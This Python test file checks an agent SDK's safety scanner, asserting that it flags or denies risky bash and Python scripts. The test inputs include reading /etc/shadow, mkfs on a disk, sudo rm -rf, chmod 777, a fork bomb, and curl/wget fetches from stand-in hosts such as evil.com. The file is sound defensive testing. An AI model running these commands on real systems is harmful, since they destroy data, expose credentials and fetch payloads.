"""Final batch of coverage tests targeting remaining uncovered lines."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy

# ==========================================================================
# _safety_wrapper.py: lines 255, 282 (sync wrapper edge cases)
# ==========================================================================


def test_safety_wrapper_sync_script_not_str_with_require():
    """sync_wrapper: non-str script value with require_script=True raises."""
    from trpc_agent_sdk.tools.safety import safety_wrapper

    @safety_wrapper(tool_name="sync_nonstr", script_arg_name="code", require_script=True)
    def sync_func(*args, **kwargs):
        return "should not reach"

    with pytest.raises(RuntimeError, match="not found"):
        sync_func(code=42)


# ==========================================================================
# _scanner.py: lines 488-505 (Python AST process/privilege findings), etc.
# ==========================================================================


def test_scanner_python_privilege_call():
    """Python os.setuid must produce AST-PROC-001 with risk=privilege."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="import os; os.setuid(0)", script_type=ScriptType.PYTHON, tool_name="setuid"))
    findings = [f for f in r.findings if f.rule_id == "AST-PROC-001"]
    assert any("privilege" in f.message.lower() for f in findings)


def test_scanner_python_file_write_non_tmp():
    """Python file write outside /tmp must trigger MEDIUM."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="open('/etc/foo', 'w').write('x')",
                        script_type=ScriptType.PYTHON,
                        tool_name="write_etc"))
    findings = [f for f in r.findings if f.rule_id == "AST-FILE-005"]
    assert any(f.risk_level.value == "medium" for f in findings)


def test_scanner_python_file_write_tmp():
    """Python file write to /tmp must trigger LOW."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="open('/tmp/foo', 'w').write('x')",
                        script_type=ScriptType.PYTHON,
                        tool_name="write_tmp"))
    findings = [f for f in r.findings if f.rule_id == "AST-FILE-005"]
    assert any(f.risk_level.value == "low" for f in findings)


def test_scanner_python_concurrency_fork():
    """os.fork must trigger CRITICAL."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="import os; os.fork()", script_type=ScriptType.PYTHON, tool_name="fork_test"))
    findings = [f for f in r.findings if f.rule_id == "AST-RES-003"]
    assert any(f.risk_level.value == "critical" for f in findings)


def test_scanner_python_network_whitelisted_domain():
    """Python network call to whitelisted domain must be INFO."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(whitelist_domains=["api.safe.com"])
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(
        SafetyScanInput(script_content="import requests; requests.get('https://api.safe.com/data')",
                        script_type=ScriptType.PYTHON,
                        tool_name="safe_net"))
    findings = [f for f in r.findings if f.rule_id == "AST-NET-002"]
    assert len(findings) > 0


# ==========================================================================
# _bash_scanner.py remaining lines
# ==========================================================================


def test_bash_dd_large_write_trigger():
    """dd with bs*count > 100MB must trigger large_write."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="dd if=/dev/zero of=/tmp/bigfile bs=1M count=200",
                        script_type=ScriptType.BASH,
                        tool_name="dd_large2"))
    findings = [
        f for f in r.findings
        if f.rule_id == "BASH-FILE-003" or "large" in f.evidence.lower() or "dd" in f.evidence.lower()
    ]
    # Should detect either as device write or large write
    assert r.decision != Decision.ALLOW


def test_bash_sensitive_file_read_cat_shadow():
    """cat /etc/shadow must trigger sensitive file read."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="cat /etc/shadow", script_type=ScriptType.BASH, tool_name="cat_shadow"))
    findings = [f for f in r.findings if f.rule_id == "BASH-FILE-002"]
    assert len(findings) > 0


def test_bash_redirect_background_token():
    """Background & operator must produce BASH-PROC-004."""
    scanner = SafetyScanner()
    r = scanner.scan(SafetyScanInput(script_content="sleep 300 &", script_type=ScriptType.BASH, tool_name="bg_op"))
    findings = [f for f in r.findings if f.rule_id == "BASH-PROC-004"]
    assert len(findings) > 0


def test_bash_mkfs_destructive():
    """mkfs must trigger destructive finding."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="mkfs.ext4 /dev/sda1", script_type=ScriptType.BASH, tool_name="mkfs_test"))
    findings = [f for f in r.findings if "mkfs" in f.evidence.lower() or "BASH" in f.rule_id]
    assert len(findings) > 0


def test_bash_sudo_privilege():
    """sudo must trigger privilege escalation."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="sudo rm -rf /etc/config", script_type=ScriptType.BASH, tool_name="sudo_test"))
    findings = [f for f in r.findings if f.rule_id == "BASH-PROC-001"]
    assert len(findings) > 0


def test_bash_install_pip():
    """pip install must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="pip install requests", script_type=ScriptType.BASH, tool_name="pip_test"))
    findings = [f for f in r.findings if f.rule_id == "BASH-DEP-001"]
    assert len(findings) > 0


def test_bash_install_npm():
    """npm install must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="npm install evil", script_type=ScriptType.BASH, tool_name="npm_test"))
    findings = [f for f in r.findings if f.rule_id == "BASH-DEP-001"]
    assert len(findings) > 0


def test_bash_source_command():
    """source command must be detected as dynamic exec."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="source /tmp/evil.sh", script_type=ScriptType.BASH, tool_name="source_cmd"))
    findings = [f for f in r.findings if f.rule_id == "BASH-PROC-003"]
    assert len(findings) > 0


def test_bash_curl_network():
    """curl to non-whitelisted domain must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="curl https://evil.malware.com/payload",
                        script_type=ScriptType.BASH,
                        tool_name="curl_test"))
    findings = [f for f in r.findings if f.rule_id == "BASH-NET-001"]
    assert len(findings) > 0


def test_bash_wget_network():
    """wget must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="wget https://evil.com/script.sh",
                        script_type=ScriptType.BASH,
                        tool_name="wget_test"))
    findings = [f for f in r.findings if f.rule_id == "BASH-NET-001"]
    assert len(findings) > 0


def test_bash_curl_whitelisted_domain():
    """curl to whitelisted domain must be INFO."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(whitelist_domains=["myapi.local"])
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(
        SafetyScanInput(script_content="curl https://myapi.local/health",
                        script_type=ScriptType.BASH,
                        tool_name="curl_white"))
    findings = [f for f in r.findings if f.rule_id == "BASH-NET-002"]
    assert len(findings) > 0


def test_bash_pipe_whitelisted_commands():
    """Pipe between whitelisted commands must be INFO."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(whitelist_commands=["echo", "grep"])
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(
        SafetyScanInput(script_content="echo hello | grep world", script_type=ScriptType.BASH, tool_name="pipe_white"))
    findings = [f for f in r.findings if f.rule_id == "BASH-PROC-002"]
    assert any(f.risk_level.value == "info" for f in findings)


# ==========================================================================
# _rules.py remaining lines (destructive ops, network egress rule paths)
# ==========================================================================


def test_rules_destructive_chmod():
    """Blocklist destructive: chmod 777."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(blocklist_commands=["chmod 777"])
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(
        SafetyScanInput(script_content="chmod 777 /etc", script_type=ScriptType.BASH, tool_name="chmod_test"))
    assert r.decision == Decision.DENY


def test_rules_blocklist_fork_bomb_command():
    """Blocklist must catch fork bomb."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(blocklist_commands=[":(){ :|:& };:"])
    scanner = SafetyScanner(policy=policy)
    r = scanner.scan(SafetyScanInput(script_content=":(){ :|:& };:", script_type=ScriptType.BASH, tool_name="bl_fork"))
    assert r.decision == Decision.DENY


# ==========================================================================
# _scanner.py blocklist-related remaining lines
# ==========================================================================


def test_scanner_blocklist_override_unknown_script_type():
    """_check_blocklist_override with UNKNOWN script_type."""
    from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
    policy = SafetyPolicy(blocklist_patterns=[r"evil_cmd"])
    scanner = SafetyScanner(policy=policy)
    decision, findings = scanner._check_blocklist_override("run evil_cmd here", Decision.NEEDS_HUMAN_REVIEW,
                                                           ScriptType.UNKNOWN)
    assert decision == Decision.DENY


# ==========================================================================
# _python_scanner.py additional coverage
# ==========================================================================


def test_python_sleep_below_threshold():
    """time.sleep(1) must NOT trigger long sleep."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="import time; time.sleep(1)",
                        script_type=ScriptType.PYTHON,
                        tool_name="short_sleep"))
    findings = [f for f in r.findings if f.rule_id == "AST-RES-002"]
    assert len(findings) == 0


def test_python_concurrency_multiprocessing_pool():
    """multiprocessing.Pool must be detected."""
    scanner = SafetyScanner()
    r = scanner.scan(
        SafetyScanInput(script_content="from multiprocessing import Pool; Pool(4)",
                        script_type=ScriptType.PYTHON,
                        tool_name="mp_pool"))
    findings = [f for f in r.findings if f.rule_id == "AST-RES-003"]
    assert len(findings) > 0


def test_python_domain_extractor_edge():
    """_extract_domain_from_url edge cases."""
    from trpc_agent_sdk.tools.safety._python_scanner import _extract_domain_from_url
    assert _extract_domain_from_url("https://user:pass@host.com/path") == "host.com"
    assert _extract_domain_from_url("not_a_url") is None
